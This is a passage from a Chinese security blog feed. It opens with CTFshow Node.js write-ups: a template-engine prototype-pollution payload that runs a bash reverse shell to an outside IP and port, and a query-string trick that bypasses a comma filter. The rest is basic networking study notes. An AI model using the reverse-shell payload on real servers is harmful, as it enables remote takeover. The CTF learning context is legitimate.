href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn)</a></p><p><a href="https://xz.aliyun.com/t/7075#toc-0">ejs原型污染rce分析 - 先知社区 (aliyun.com)</a></p><p>用一个payload都能打</p><pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220223144941601.png" alt="image-20220223144941601"></p><h2 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h2><p>代码：</p><pre class="language-none"><code class="language-none">router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;  res.type(&#39;html&#39;);  var flag &#x3D; &#39;flag_here&#39;;  if(req.url.match(&#x2F;8c|2c|\,&#x2F;ig))&#123;  res.end(&#39;where is flag :)&#39;);  &#125;  var query &#x3D; JSON.parse(req.query.query);  if(query.name&#x3D;&#x3D;&#x3D;&#39;admin&#39;&amp;&amp;query.password&#x3D;&#x3D;&#x3D;&#39;ctfshow&#39;&amp;&amp;query.isVIP&#x3D;&#x3D;&#x3D;true)&#123;  res.end(flag);  &#125;else&#123;  res.end(&#39;where is flag. :)&#39;);  &#125;&#125;);</code></pre><p>如果没有过滤，那么我们直接传入</p><pre class="language-none"><code class="language-none">?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</code></pre><p>就行，但是题目把逗号和他的url编码过滤了</p><p>这时就要尝试用&amp;绕过</p><pre class="language-none"><code class="language-none">nodejs 会把同名参数以数组的形式存储，并且 JSON.parse 可以正常解析</code></pre><p>所以最终payload为</p><pre class="language-none"><code class="language-none">?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;&amp;query&#x3D;&quot;password&quot;:&quot;%63tfshow&quot;&amp;query&#x3D;&quot;isVIP&quot;:true&#125; </code></pre><p>把c也编码的原因是防止和双引号的url编码构成%22c</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220223150552411.png" alt="image-20220223150552411"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF复现</title>
      <link href="/2022/02/13/VNCTF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/02/13/VNCTF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ab266f230805d857cdd4b18f19a87ca5f2cb27a5ea832561feb51d95a820f109"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ict学习笔记</title>
      <link href="/2022/01/24/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/01/24/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="数据通信网络基础"><a href="#数据通信网络基础" class="headerlink" title="数据通信网络基础"></a>数据通信网络基础</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>通信：人与人，人与物，物与物之间通过某种媒介和行为进行的信息传递与交流</p><p>网络通信：终端设备之间通过计算机网络进行的通信</p><h2 id="信息传递过程"><a href="#信息传递过程" class="headerlink" title="信息传递过程"></a>信息传递过程</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124122207098.png" alt="image-20220124122207098"></p><p>数据被打包成原始的数据载荷，并添加一定信息(目的地址)的头部和尾部形成报文(封装)，报文通过网线到达网关，网关对报文进行&quot;解封装&quot;，读取目的地址，再重新封装，根据不同的目的地址送往不同的路由器，报文由此离开本地网络，进入internet的干道进行传输，后进入目的地址所在的本地链路，由本地链路的网关或路由器再进行解封装和封装，并根据目的地址觉得发往相应的下一台路由器，最终到达目的计算机所在的网络的网关，再进行解封装和封装，根据目的地址发往相应的计算机。计算机收到报文后对其进行校验处理，校验无误后，接收报文，并将其中的数据载荷交由相应的应用程序进行处理。</p><h2 id="常见术语"><a href="#常见术语" class="headerlink" title="常见术语"></a>常见术语</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124122239944.png" alt="image-20220124122239944"></p><p>• 数据载荷：可以理解为最终想要传递的信息，但实际上，在具有层次化结构的通信过程中， 上一层协议传递给下一层协议的数据单元（报文）都可以称之为下一层协议的数据载荷。 </p><p>• 报文：网络中交换与传输的数据单元，具有一定的内在格式，通常都具有头部+数据载荷+ 尾部的基本结构。传输过程中，报文的格式和内容可能发生改变。 </p><p>• 头部：为了更好的传递信息，在组装报文时，在数据载荷的前面添加的信息段统称为报文 的头部。 </p><p>• 尾部：为了更好的传递信息，在组装报文时，在数据载荷的后面添加的信息段统称为报文 的尾部。注意，很多报文是没有尾部的。</p><p>• 封装：分层协议所采用的一种技术，底层协议收到来自上层协议的消息时，将该消息附加 到底层帧的数据部分。 • 解封装：是封装的逆过程，也就是去掉报文的头部和尾部，获取数据载荷的过程。</p><p>• 网关：是在采用不同体系结构或协议的网络之间进行互通时，用于提供协议转换、路由选 择、数据交换等功能的网络设备。网关是一种根据其部署位置和功能而命名的术语，而不 是一种特定的设备类型。</p><p>• 路由器：为报文选择传递路径的网络设备。 </p><p>• 终端设备：数据通信系统的端设备，作为数据的发送者或接收者，提供用户接入协议操作 所需必要功能，可以是计算机、服务器、VoIP、手机等。</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>数据通信网络：</strong>由路由器，交换机，防火墙，无线控制器，无线接入点，以及个人电脑，网络打印机，服务器等设备构成的通信网络。</p><p><strong>功能：</strong>实现数据互通</p><h2 id="网络设备"><a href="#网络设备" class="headerlink" title="网络设备"></a>网络设备</h2><p><strong>交换机：</strong>距离终端用户最近的设备，用于终端用户接入网络、对数据帧进行交换</p><ul><li>终端设备（pc，服务器等）的网络接入</li><li>二层交换</li></ul><p>在园区网络中，交换机一般来说是距离终端用户最近的设备，接入层的交换机一般为 <strong>二层交换机</strong>，又称为<strong>以太网交换机</strong>，二层是指<strong>TCP/IP参考模型的数据链路层</strong>； </p><p>以太网交换机可以实现：<strong>数据帧的交换</strong>、<strong>终端用户设备的接入</strong>、<strong>基本的接入安全功能</strong>、 <strong>二层链路的冗余</strong>等； </p><p>广播域：一个节点发送一个广播报文其余节点都能够收到的节点的集合</p><p><strong>路由器：</strong>网络层设备，可以在因特网中进行数据的转发</p><ul><li>实现同类型网络或异种网络之间的通信</li><li>隔离广播域</li><li>维护路由表、运行路由协议</li><li>路径（路由信息）选择、IP报文的转发</li><li>广域网接入、网络地址转换</li><li>连接通过交换机组建的二层网络</li></ul><p>路由器工作在TCP/IP参考模型的网络层； 路由器可以实现：维护路由表和路由信息、路由发现及路径   选择、数据转发、隔离广 播域、广域网接入和网络地址转换及特定的安全功能</p><p><strong>防火墙</strong>：网络安全设备，用于控制两个网络之间的安全通信。通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，以此来实现对网络的安全保护</p><ul><li>隔离不同安全级别的网络</li><li>实现不同安全级别的网络之间的访问控制（安全策略）</li><li>用户身份认真</li><li>实现远程接入功能</li><li>实现数据加密及虚拟专用网业务</li><li>执行网络地址转换</li><li>其他安全功能</li></ul><p>是位于两个信任程度不同的网络之间（如企业内部网络和Internet之间）的设备，它 对两个网络之间的通信进行控制，通过强制实施统一的安全策略，防止对重要信息资 源的非法存取和访问，以达到保护系统安全的目的。</p><p><strong>无线网络：</strong></p><ul><li><p>​    无线局域网WLAN广义上是指以无线电波、激光、红外线等无线信号来代替有线局域网中 的部分或全部传输介质所构成的网络。而常见的Wi-Fi是指IEEE 802.11标准上的无线局域网 技术。</p></li><li><p>​    在WLAN中，常见的设备有胖AP、瘦AP和无线控制器AC。 </p><ul><li><p>无线接入点 (AP, Access Point）</p><ul><li>​    一般支持FAT AP、FIT AP和云管理工作模式，根据网络规划的需求，可以灵活地在各种模式下切换。</li><li>​    FAT AP：适用于家庭，独立工作，需单独配置，功能较为单一，成本低。</li><li>​    FIT AP：适用于大中型企业，需要配合AC使用，由AC统一管理和配置，功能丰富。</li><li>​    云管理：适用于中小型企业，需要配合云管理平台使用，由云管理平台统一管<br>理和配置，功能丰富，即插即用。</li></ul></li><li><p>无线接入控制器 (AC, Access Controller) </p><ul><li>​    一般位于整个网络的汇聚层，提供高速、安全、可靠的WLAN业务。 </li><li>​    提供大容量、高性能、高可靠性、易安装、易维护的无线数据控制业务，具有 组网灵活、绿色节能等优势</li></ul></li></ul></li></ul><h2 id="局域网、城域网、广域网"><a href="#局域网、城域网、广域网" class="headerlink" title="局域网、城域网、广域网"></a><strong>局域网、城域网、广域网</strong></h2><p>局域网：覆盖范围在几公里之内。主要作用是把分布较近的若干终端电脑连接起来，使用以太网、wi-fi等技术</p><p>城域网：较大型的局域网，成本高，传输速率快。改进了局域网的传输介质，扩大了访问范围。主要作用是将同一城市内不同地点的主机、数据库以及局域网等连接起来；与广域网作用相似，但实现方式和性能不同。基于大型的局域网，与局域网技术相似，如：以太网 (10Gbps/100Gbps)、 WiMAX (全球互通微波访问)</p><p>广域网：覆盖范围一般在几公里以上，可大至几十、几百或几千公里。主要作用是把分布较远 (如: 跨越城市、跨越国家， 等等) 的若干局域网或城域 网连接起来；会用到电信运营商的通信线路。使用HDLC、PPP等技术</p><h2 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h2><p>是指用传输介质（如双绞线、光纤等）互联各种设备所呈现的结构化布局。</p><p><strong>形态</strong></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124181356966.png" alt="image-20220124181356966"></p><p>星型网络：</p><ul><li>所有节点通过一个中心节点连接在一起。</li><li>优点：容易在网络中增加新的节点。通信数据必须经过中心节点中转，易于实现网络 监控。</li><li>缺点：中心节点的故障会影响到整个网络的通信。</li></ul><p>总线型网络：</p><ul><li>所有节点通过一条总线（如同轴电缆）连接在一起。</li><li>优点：安装简便，节省线缆。某一节点的故障一般不会影响到整个网络的通信。</li><li>缺点：总线故障会影响到整个网络的通信。某一节点发出的信息可以被所有其他节点 收到，安全性低。</li></ul><p>环形网络：</p><ul><li>所有节点连成一个封闭的环形。</li><li>优点：节省线缆。</li><li>缺点：增加新的节点比较麻烦，必须先中断原来的环，才能插入新节点以形成新环。</li></ul><p>树形网络：</p><ul><li>树型结构实际上是一种层次化的星型结构。</li><li>优点：能够快速将多个星型网络连接在一起，易于扩充网络规模。</li><li>缺点：层级越高的节点故障导致的网络问题越严重</li></ul><p>全网状网络：</p><ul><li>所有节点都通过线缆两两互联。</li><li>优点：具有高可靠性和高通信效率。</li><li>缺点：每个节点都需要大量的物理端口，同时还需要大量的互连线缆。成本高，不易 扩展。</li></ul><p>部分网状网络：</p><ul><li>只是重点节点之间才两两互连。</li><li>优点：成本低于全网状网络。</li><li>缺点：可靠性比全网状网络有所降低。</li></ul><p> 在实际组网中，通常都会根据成本、通信效率、可靠性等具体需求而采用多种拓扑形态相 结合的方法。</p><h2 id="网络工程"><a href="#网络工程" class="headerlink" title="网络工程"></a>网络工程</h2><p>网络工程，就是围绕着网络进行的一系列的活动，包括：网络规划、设计、实施、调试、 排错等。</p><p>网络工程设计的知识领域很宽广，其中路由和交换是计算机网络的基本</p><p>网络工程师：</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124182016579.png" alt="image-20220124182016579"></p><h1 id="网络参考模型"><a href="#网络参考模型" class="headerlink" title="网络参考模型"></a>网络参考模型</h1><h2 id="应用和数据"><a href="#应用和数据" class="headerlink" title="应用和数据"></a>应用和数据</h2><p><strong>应用：</strong>应用的存在是为了满足人们的各种需求，伴随着应用会有信息的产生。比如文本，图片，视频等都是信息的不同呈现方式</p><p><strong>数据：</strong>数据是各种信息的载体，大部分应用程序所产生的数据需要在不同的设备之间传递。</p><p>• 计算机只能识别0和1的组成的电子数据(digital data)。它不具备读取各种信息的能力，所 以信息需要通过一定的规则翻译成数据。 </p><p>• 而对人来说，我们不具备读取电子数据的能力，所以在读取信息的时候，需要将数据转成 人能理解的信息。 </p><p>• 对于一名网络工程师来说，需要更关注数据的端到端传递的过程。</p><h2 id="OSI参考模型"><a href="#OSI参考模型" class="headerlink" title="OSI参考模型"></a>OSI参考模型</h2><p> OSI 模型(Open Systems Interconnection Model)，由国际化标准组织ISO (The  International Organization for Standardization ) 收录在ISO 7489标准中并于1984年发布。</p><p>OSI参考模型又被称为七层模型，由下至上依次为：</p><ul><li>物理层：在设备之间传输比特流，规定了电平、速度和电缆针脚等物理特性。</li><li>物理层：在设备之间传输比特流，规定了电平、速度和电缆针脚等物理特性。</li><li>网络层：定义逻辑地址，供路由器确定路径，负责将数据从源网络传输到目的网络。</li><li>传输层：提供面向连接或非面向连接的数据传递以及进行重传前的差错检测。</li><li>会话层：负责建立、管理和终止表示层实体之间的通信会话。该层的通信由不同设备 中的应用程序之间的服务请求和响应组成。</li><li>表示层：提供各种用于应用层数据的编码和转换功能，确保一个系统的应用层发送的 数据能被另一个系统的应用层识别。</li><li>应用层：OSI参考模型中最靠近用户的一层，为应用程序提供网络服务。</li></ul><h2 id="TCP-IP参考模型"><a href="#TCP-IP参考模型" class="headerlink" title="TCP/IP参考模型"></a>TCP/IP参考模型</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124182840485.png" alt="image-20220124182840485"></p><p>结构上与OSI模型类似，采用分层架构，同时层与层之间联系紧密。</p><p>TCP/IP标准参考模型将OSI中的数据链路层和物理层合并为网络接入层，这种划分方式其实 是有悖于现实协议制定情况的，故融合了TCP/IP标准模型和OSI模型的TCP/IP对等模型被提出</p><h2 id="TCP-IP常见协议"><a href="#TCP-IP常见协议" class="headerlink" title="TCP/IP常见协议"></a>TCP/IP常见协议</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124183002339.png" alt="image-20220124183002339"></p><p>应用层</p><ul><li>HTTP（Hypertext Transfer Protocol，超文本传输协议）：用来访问在网页服务器上 的各种页面。</li><li>FTP（File Transfer Protocol，文件传输协议）：为文件传输提供了途径，它允许数据从一台主机传送到另一台主机上，用于文件的下载和上传，采用C/S（Client/Server）结构。</li><li>DNS（Domain Name Service，域名称解析服务）：用于实现从主机域名到IP地址之 间的转换。</li><li>Telnet：是数据网络中提供远程登录服务的标准协议。Telnet为用户提供了在本地计算机上完成远程设备工作的能力。</li></ul><p>传输层</p><ul><li> TCP （Transmission Control Protocol，传输控制协议） ：为应用程序提供可靠的面向连接的通信服务。目前，许多流行的应用程序都使用TCP。</li><li> UDP（User Datagram Protocol，用户数据报协议）：提供了无连接通信，且不对传 送数据包进行可靠性的保证。</li></ul><p>网络层</p><ul><li>IP（Internet Protocol，互联网协议）：将传输层的数据封装成数据包并完成源站点 到目的站点的转发，提供无连接的、不可靠的服务。</li><li>IGMP（Internet Group Management Protocol，因特网组管理协议）：负责IP组播 成员管理的协议。它用来在IP主机和与其直接相邻的组播路由器之间建立、维护组播 组成员关系。</li><li>ICMP（Internet Control Message Protocol，网际报文控制协议）：基于IP协议在网 络中发送控制消息，提供可能发生在通信环境中的各种问题反馈。通过这些信息，使 管理者可以对所发生的问题作出诊断，然后采取适当的措施解决。</li></ul><p>数据链路层</p><ul><li>PPP（Point-to-Point Protocol，点对点协议）：一种点对点模式的数据链路层协议， 多用于广域网。</li><li>Ethernet( 以太网协议 )：一种多路访问广播型数据链路层协议，是当前应用最为广 泛的局域网技术。</li><li>PPPoE（Point-to-Point Protocol over Ethernet，以太网承载PPP协议）：PPPoE提 供通过简单桥接访问设备（接入设备）把一个网络的多个主机连接到远程访问集中器 的功能。常见的应用有家庭宽带拨号上网。</li></ul><h2 id="常见协议标准化组织"><a href="#常见协议标准化组织" class="headerlink" title="常见协议标准化组织"></a>常见协议标准化组织</h2><p><strong>IETF：</strong>负责开发和推广互联网协议（特别是TCP/IP协议族的协议）的志愿组织</p><p><strong>IEEE：</strong>制定了全世界电子，电气和计算机科学领域30%左右的标准，如IEEE802.3（Ethernet）、IEEE802.11（WiFi）等。</p><p><strong>ISO：</strong>指定计算机网络标准，如OSI模型</p><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><p>应用层为应用软件提供接口，使应用程序能够使用网络服务。应用层协议会指定使用相应的传输层协议，以及传输层所使用的端口等。</p><p>应用层的PDU被称为Data（数据）。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124184248517.png" alt="image-20220124184248517"></p><p>TCP/IP每一层都让数据得以通过网络进行传输，这些层之间使用PDU（Packet Data Unit， 协议数据单元）彼此交换信息，确保网络设备之间能够通信。</p><p>不同层的PDU中包含有不同的信息，因此PDU在不同层被赋予了不同的名称</p><p><strong>FTP:</strong></p><p><strong>FTP客户端</strong>提供本地设备对远程服务器的文件进行操作的命令，用户在PC上通过应用程序作为FTP Client，并与FTP服务器建立连接后，可以对FTP Server上的文件进行操作</p><p><strong>FTP服务器</strong>是运行FTP服务的设备，提供远程客户端访问和操作的功能，用户可以通过FTP客户端程序登录到服务器上，访问设备上的文件。</p><p><strong>Telnet：</strong></p><p>用户通过Telnet客户端程序连接到Telnet服务器。用户在Telnet客户端中输入命令，这些命令会在服务器端运行，就像直接在服务端的控制台输入一样</p><h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><p>传输层协议接收来自应用层的数据baoz，封装上相应的传输层头部，帮助其建立“端到端”的连接。</p><p>传输层的PDU被称为Segment（段）。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124185652699.png" alt="image-20220124185652699"></p><h3 id="TCP和UDP"><a href="#TCP和UDP" class="headerlink" title="TCP和UDP"></a>TCP和UDP</h3><p>报文格式</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124185736705.png" alt="image-20220124185736705"></p><p><strong>TCP报文头部：</strong></p><ul><li>Source Port：源端口，标识哪个应用程序发送。长度为16比特。</li><li>Destination Port：目的端口，标识哪个应用程序接收。长度为16比特。</li><li>Sequence Number：序号字段。TCP链接中传输的数据流每个字节都编上一个序号。 序号字段的值指的是本报文段所发送数据的第一个字节的序号。长度为32比特。</li><li>Acknowledgment Number：确认序列号，是期望收到对方下一个报文段数据的第1 个字节的序号，即上次已成功接收到的数据段的最后一个字节数据的序号加1。只有 Ack标识为1，此字段有效。长度为32比特。</li><li>Header Length：头部长度，指出TCP报文头部长度，以32比特（4字节）为计算单位。 若无选项内容，则该字段为5，即头部为20字节。</li><li>Reserved：保留，必须填0。长度为6比特。</li><li>Control bits：控制位，包含FIN、ACK、SYN等标志位，代表不同状态下的TCP数据 段。</li><li>Window：窗口TCP的流量控制，这个值表明当前接收端可接受的最大的数据总数 （以字节为单位）。窗口最大为65535字节。长度为16比特。</li><li>Checksum：校验字段，是一个强制性的字段，由发端计算和存储，并由收端进行验 证。在计算检验和时，要包括TCP头部和TCP数据，同时在TCP报文段的前面加上12 字节的伪头部。长度为16比特。</li><li>Urgent:紧急指针，只有当URG标志置1时紧急指针才有效。TCP的紧急方式是发送端 向另一端发送紧急数据的一种方式。紧急指针指出在本报文段中紧急数据共有多少个 字节（紧急数据放在本报文段数据的最前面）。长度为16比特。</li><li>Options：选项字段（可选），长度为0-40字节。</li></ul><p><strong>UDP报文头部</strong></p><ul><li>Source Port:源端口，标识哪个应用程序发送。长度为16比特。</li><li>Source Port:源端口，标识哪个应用程序发送。长度为16比特。</li><li>Length:该字段指定UDP报头和数据总共占用的长度。可能的最小长度是8字节，因为 UDP报头已经占用了8字节。由于这个字段的存在，UDP报文总长不可能超过65535 字节（包括8字节的报头，和65527字节的数据）。</li><li>Checksum:覆盖UDP头部和UDP数据的校验和，长度为16比特</li></ul><p><strong>端口号</strong></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124190431491.png" alt="image-20220124190431491"></p><p><strong>TCP的建立-三次握手</strong></p><p>▫由TCP连接发起方（图中PC1），发送第一个SYN位置1的TCP报文。初始序列号a为一 个随机生成的数字，因为没收到过来自PC2的任何报文，所以确认序列号为0 ； </p><p>▫ 接收方（图中PC2）接收到合法的SYN报文之后，回复一个SYN和ACK置1的TCP报文。 初始序列号b为一个随机生成的数字，同时因为此报文是回复给PC1的报文，所以确 认序列号为a+1； </p><p>▫ PC1接收到PC2发送的SYN和ACK置位的TCP报文后，回复一个ACK置位的报文，此时 序列号为a+1,确认序列号为b+1。PC2收到之后，TCP双向连接建立</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124193244163.png" alt="image-20220124193244163"></p><p><strong>TCP的序列号与确认序列号：</strong></p><p>TCP使用序列号和确认序列号字段实现数据的可靠和有序传输。</p><p>• 假设PC1要给PC2发送一段数据，传输过程如下： </p><p>​         ▫ 1. PC1将全部待TCP发送的数据按照字节为单位编上号。假设第一个字节的编号为 “a+1”，第二个字节的序号为“a+2”，依次类推。</p><p>​         ▫ 2. PC1会把每一段数据的第一个字节的编号作为序列号（Sequence number），然后将TCP报文发送出去。</p><p>​         ▫ 3. PC2在收到PC1发送来的TCP报文后，需要给予确认同时请求下一段数据，如何确 定下一段数据呢？序列号( a+1 )+载荷长度=下一段数据的第一个字节的序号 （a+1+12） </p><p>​        ▫ 4. PC1在收到PC2发送的TCP报文之后，发现确认序列号为“a+1+12” ，说明“a+1” 到“a+12”这一段的数据已经被接受，需要从“a+1+12”开始发送。</p><p> • 为了提升发送效率，也可以一次性发送多段数据，由接收方统一确认。</p><p><strong>TCP的窗口滑动机制</strong></p><p>• 1. 在TCP三次握手建立连接时，双方都会通过Window字段告诉对方本端最大能够接受的字 节数（也就是缓冲区大小）。</p><p>• 2. 连接建立成功之后，发送方会根据接受方宣告的Window大小发送相应字节数的数据。 </p><p>• 3. 接受方接受到数据之后会放在缓冲区内，等待上层应用来取走缓冲的数据。若数据被上 层取走，则相应的缓冲空间将被释放。 </p><p>• 4. 接收方根据自身的缓存空间大小通告当前的可以接受的数据大小( Window )。 </p><p>• 5. 发送方根据接收方当前的Window大小发送相应数量的数据</p><p><strong>TCP的关闭-四次挥手</strong></p><p>▫ 1. 由PC1发出一个FIN字段置”1 ”的不带数据的TCP段；</p><p> ▫ 2. PC2收到PC1发来的FIN置位的TCP报文后，会回复一个ACK置位的TCP报文。 </p><p>▫ 3. 若PC2也没有需要发送的数据，则直接发送FIN置位的TCP报文。假设此时PC2还有 数据要发送，那么当PC2发送完这些数据之后会发送一个FIN置位的TCP报文去关闭连 接。 </p><p>▫ 4. PC1收到FIN置位的TCP报文，回复ACK报文，TCP双向连接断开</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124202101704.png" alt="image-20220124202101704"></p><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p>传输层负责建立主机之间进程与进程之间的连接，而网络层则负责数据从一台主机到另一台主机之间的传递。</p><p>网络层的PDU被称为包</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124202325984.png" alt="image-20220124202325984"></p><h3 id="网络层协议工作过程"><a href="#网络层协议工作过程" class="headerlink" title="网络层协议工作过程"></a>网络层协议工作过程</h3><ul><li> 当采用IP作为网络层协议时，通信的双方都会被分配到一个“独一无二”的IP地址来标识自 己。IP地址可被写成32位的二进制整数值形式，但为了方便人们阅读和分析，它通常被写 成点分十进制的形式，即四个字节被分开用十进制表示，中间用点分隔，比如192.168.1.1。</li><li>IP数据包的封装与转发：<ul><li>网络层收到上层（如传输层）协议传来的数据时候，会封装一个IP报文头部，并且把 源和目的IP地址都添加到该头部中。</li><li>中间经过的网络设备（如路由器），会维护一张指导IP报文转发的“地图”——路由 表，通过读取IP数据包的目的地址，查找本地路由表后转发IP数据包。</li><li>IP数据包最终到达目的主机，目的主机通过读取目的IP地址确定是否接受并做下一步 处理。</li></ul></li><li> IP协议工作时，需要如OSPF、IS-IS、BGP等各种路由协议帮助路由器建立路由表，ICMP帮 忙进行网络的控制和状态诊断。</li></ul><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124202532079.png" alt="image-20220124202532079"></p><h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>数据链路层位于网络层和物理层之间，可以向网络层的IP、IPV6等协议提供服务，数据链路层的PDU被称为Frame（帧）。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124202733379.png" alt="image-20220124202733379"></p><h3 id="以太网与MAC地址"><a href="#以太网与MAC地址" class="headerlink" title="以太网与MAC地址"></a>以太网与MAC地址</h3><p><strong>以太网：</strong>是一种支持多点接入的广播式数据链路层协议。个人电脑的网络接口遵循的就是以太网标准。一般情况下，一个广播域对应一个IP网段。</p><p><strong>以太网MAC地址：</strong>MAC地址在网络中唯一标识一个网卡，每个网卡都需要且会有唯一的一个MAC地址，MAC地址用于在一个IP网段内，寻址找到具体的物理设备。工作在数据链路层的设备，例如以太网交换机，会维护一张MAC地址表，用于指导数据帧转发。MAC地址由48比特（6个字节）长，12位的16进制数字组成。例如：48-A4-72-1C-8F-4F</p><h3 id="地址解析协议（ARP"><a href="#地址解析协议（ARP" class="headerlink" title="地址解析协议（ARP)"></a>地址解析协议（ARP)</h3><p>ARP（Address Resolution Protocol，地址解析协议）是根据IP地址获取数据链路层地址的 一个TCP/IP协议。</p><p>ARP是IPv4中必不可少的一种协议，它的主要功能是：</p><ul><li>将IP地址解析为MAC地址；</li><li>维护IP地址与MAC地址的映射关系的缓存，即ARP表项；</li><li>实现网段内重复IP地址的检测。</li></ul><h3 id="ARP的工作原理"><a href="#ARP的工作原理" class="headerlink" title="ARP的工作原理"></a>ARP的工作原理</h3><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124203445209.png" alt="image-20220124203445209"></p><ul><li>网络设备一般都有一个ARP缓存（ARP Cache）。ARP缓存用来存放IP地址和MAC地址的关联信息。</li><li>在发送数据前，设备会先查找ARP缓存表。如果缓存表中存在对方设备的ARP表项，则直接 采用该表项中的MAC地址来封装帧，然后将帧发送出去。如果缓存表中不存在相应信息， 则通过发送ARP Request报文来获得它。</li><li>学习到的IP地址和MAC地址的映射关系会被放入ARP缓存表中存放一段时间。在有效期内 （缺省：180s），设备可以直接从这个表中查找目的MAC地址来进行数据封装，而无需进 行ARP查询。过了这段有效期，ARP表项会被自动删除。</li><li>如果目标设备位于其他网络，则源设备会在ARP缓存表中查找网关的MAC地址。然后将数 据发送给网关。最后网关再把数据转发给目的设备</li></ul><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124203752805.png" alt="image-20220124203752805"></p><ul><li> 主机1的ARP缓存表中不存在主机2的MAC地址，所以主机1会发送ARP Request来获取目的 MAC地址。</li><li> ARP Request报文封装在以太帧里。帧头中的源MAC地址为发送端主机1的MAC地址。此时， 由于主机1不知道主机2的MAC地址，所以目的MAC地址为广播地址FF-FF-FF-FF-FF-FF。</li><li> ARP Request报文中包含发送端MAC地址、发送端IP地址、目的端MAC地址、目的端IP地 址，其中目的端MAC地址的值为0。ARP Request报文会在整个网络上传播，该网络中所有 主机包括网关都会接收到此ARP 